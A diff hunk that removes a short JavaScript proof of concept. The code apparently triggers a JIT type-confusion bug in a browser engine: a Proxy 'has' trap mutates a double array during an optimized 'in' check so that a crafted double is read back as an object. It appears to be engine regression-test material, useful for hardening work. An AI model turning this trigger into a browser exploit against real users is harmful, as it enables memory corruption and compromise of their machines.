@@ -1,5 +1,0 @@
-function opt ( arr , arr2 ) { arr [ 1 ] = 1.1 ; let tmp = 0 in arr2 ; arr [ 0 ] = 2.3023e-320 ; return tmp ; } function main ( ) { let o = document . body . appendChild ( document . createElement ( 'iframe' ) ) . contentWindow ; o . eval ( `
-let p = new Proxy({}, {});
-let a = {__proto__: {}};
-a.__proto__.__proto__ = p;
-` ) ; let arr = [ 1.1 , 2.2 ] ; let arr2 = [ 1.1 , 2.2 ] ; let proto = new o . Object ( ) ; let handler = { } ; arr2 . __proto__ = proto ; proto . __proto__ = new Proxy ( { } , { has ( ) { arr [ 0 ] = { } ; return true ; } } ) ; for ( let i = 0 ; i < 10000 ; i ++ ) { opt ( arr , arr2 ) ; } setTimeout ( ( ) => { delete arr2 [ 0 ] ; opt ( arr , arr2 ) ; console . log ( arr [ 0 ] ) ; } , 500 ) ; } main ( ) ; 
